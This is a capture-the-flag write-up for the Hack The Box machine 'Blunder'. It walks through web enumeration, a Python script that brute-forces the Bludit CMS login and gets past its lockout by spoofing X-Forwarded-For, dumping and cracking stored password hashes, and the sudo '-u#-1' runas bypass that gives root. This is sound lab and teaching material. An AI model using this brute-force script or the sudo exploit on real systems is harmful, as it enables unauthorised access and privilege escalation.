[Blunder](https://www.hackthebox.eu/home/machines/profile/254) is an easy linux box by [egotisticalSW](https://www.hackthebox.eu/home/users/profile/94858).

### Overview

The box starts with web-enumeration, where we find an instance of Bludit-CMS running. Using a CeWL and a known bruteforce-login-bypass, we get access as administrator. We then use a Metasploit-module to get a shell as www-data.

To get user, we enumerate the system and find hashes stored on the file-system, which we crack and use to login as user.

To get root we exploit a known sudo-vulnerability that allows us to bypass the sudo runas-restrictions.

# Information Gathering

## Nmap

We begin our enumeration with a nmap scan for open ports.

```bash
root@darkness:~# nmap -sC -sV 10.10.10.191
Nmap scan report for 10.10.10.191
Host is up (0.059s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
```

# Enumeration
The only open port shown by nmap is **80** (http). 

## HTTP - Port 80

Let us start our web-enumeration by going to http://10.10.10.191.

![Webpage](/assets/htb/Blunder/webpage-index.png)

Upon visiting the url, the following blog is shown. It seems like no interesting content can be found, so let us start a gobuster to search for further content.

#### Fuzzing directories and files using gobuster

```bash
root@darkness:~# gobuster dir -u http://10.10.10.191/ -w /usr/share/wordlists/dirbuster
/directory-list-2.3-medium.txt -x txt -t 50

/admin (Status: 301)
/robots.txt (Status: 200)
/todo.txt (Status: 200)
/LICENSE (Status: 200)
```

Running the gobuster, we find multiple directories and files with the most interesting ones being `/admin` and `/todo.txt`.

Let us check out `/admin` next.

#### Finding and enumerating Bludit CMS

Going to http://10.10.10.191/admin we get to a login prompt for `Bludit`. Researching on google, it turns out [Bludit](https://www.bludit.com/) is a CMS. After some more research, I found a a [login bruteforce bypass poc](https://rastating.github.io/bludit-brute-force-mitigation-bypass) that can be used to bruteforce passwords without getting temporarily banned after too many failed attempts.

Next, let us check out the `todo.txt` file. 

```bash
root@darkness:~# curl 10.10.10.191/todo.txt
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

Checking `todo.txt`, we get a potential username (`fergus`).

Now that we have a username we have to decide on which wordlist to use for bruteforcing.

#### Using CeWL to generate wordlists

We can use a tool called [CeWL](https://github.com/digininja/CeWL) to grep all words from the website and use it as possible password-candidates.

```bash
root@darkness:~# cewl http://10.10.10.191 -w wl.txt -m 5
root@darkness:~#  cat wl.txt | wc -l
243
```

We define that all words with at least 5 characters are added to the wordlist resulting into 243 possible password candidates.

Next we can use this wordlist with the login-bypass-poc (which I have slightly modified).

```python
#!/usr/bin/env python3
import re, requests, sys

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'

for password in open("wl.txt","r"):
    password = password.rstrip() # Remove newline
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print(f'[*] Trying: {password}')

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
    sys.stdout.write("\033[F")
    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print(f'[+] Password found: {password}\n')
            break
```

Now let us run the poc with our generated wordlist.

```bash
root@darkness:~# python3 poc.py
[+] Password found: RolandDeschain
```

After running for a bit, we get a result: `RolandDeschain`. Now that we have credentials (`fergus`:`RolandDeschain`), we can search for a way to gain initial access to the server.

### Initial shell

After a bit of research I found a Metasploit-module, which seems to exploit an image-upload vulnerability. Because of lacking time, I did not tried to replicate the exploit myself (as I would usually do).

Anyways, we can run the exploit with the gathered credentials and check if we get a shell.

```ruby
msf5 > search Bludit

After running the Metasploit-module, we indeed get a shell as www-data.

### Privesc to user

Now that we have gained initial-access to the server, let us enumerate the system to escalate our privileges.

#### Enumeration as www-data

Let us start our enumeration by looking at the file-system of the server.

```bash
www-data@blunder:/var/www$ ls -alh
total 20K
drwxr-xr-x  5 root     root     4.0K Nov 28  2019 .
drwxr-xr-x 15 root     root     4.0K Nov 27  2019 ..
drwxr-xr-x  8 www-data www-data 4.0K May 19 15:13 bludit-3.10.0a
drwxrwxr-x  8 www-data www-data 4.0K Apr 28 12:18 bludit-3.9.2
```

Looking at the files in `/var/www/`, we find two installations of Bludit. Let us search both installations for the [users.php file](https://github.com/bludit/bludit/blob/8c4a6d8f9e34c75cdbdecfc326b1f8802e7feabe/install.php#L437), which should contain credentials.

```bash
www-data@blunder:/var/www$ cat */bl-content/databases/users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>                                                                     
{                                                          
    "admin": {        
        "nickname": "Hugo",                                
        "firstName": "Hugo",
        "lastName": "",                                    
        "role": "User",                                    
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
[...]
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
[...]
"fergus": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
[...]
```

Looking at both files, we get multiple hashes, however the password of the user `hugo` does not seem to contain a salt. Let us try to crack this hash first.

#### Cracking the hash

Before trying to manually crack the hash, we can try to lookup the hash online.

![Hash found online](/assets/htb/Blunder/hash-cracked.png)

Seems like the password for the user `hugo` is hashed using the `sha-1 algorithm` and in plaintext is: `Password120`.

#### Getting a shell as user (hugo)

We can now try to login as hugo on the system.

```bash
www-data@blunder:/var/www$ su hugo
Password: Password120
hugo@blunder:/var/www$ cat ~/user.txt 
33211***************************
```

We successfully login as hugo using the found password and can read user.txt.

### Privesc to root

Now that we have a shell as user, let us enumerate the system to find a privesc-vector to root.

#### Enumeration as hugo

Let us check the sudo-privileges of hugo.

```bash
hugo@blunder:/var/www$ sudo -l
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

Hugo seems to be allowed to run `/bin/bash` as any user except for root. Let us check the version of sudo next.

```bash
hugo@blunder:/var/www$ sudo -V
Sudo version 1.8.25p1
```

The installed sudo version is vulnerable to an runas-restriction-bypass and can be exploited. The exploit in full detail is explained [here](https://seclists.org/oss-sec/2019/q4/18). The basic vulnerability lies in the fact that sudo and setresuid system-call interpret the user-id differently.

#### Exploiting sudo runas-restriction-bypass

We can exploit the vulnerability by supplying `-1` as the id of the user. Whilst sudo will interpret the number as `-1`, which is not equal to 0 (root), the setresuid system-call will return `0 ` (root) instead of `-1`, resulting into escalation to root-privileges.

```bash
hugo@blunder:~$ sudo -u#-1 /bin/bash
root@blunder:/home/hugo# cat /root/root.txt 
6e0ef2***************************
```

We successfully exploit the vulnerability and can read root.txt.
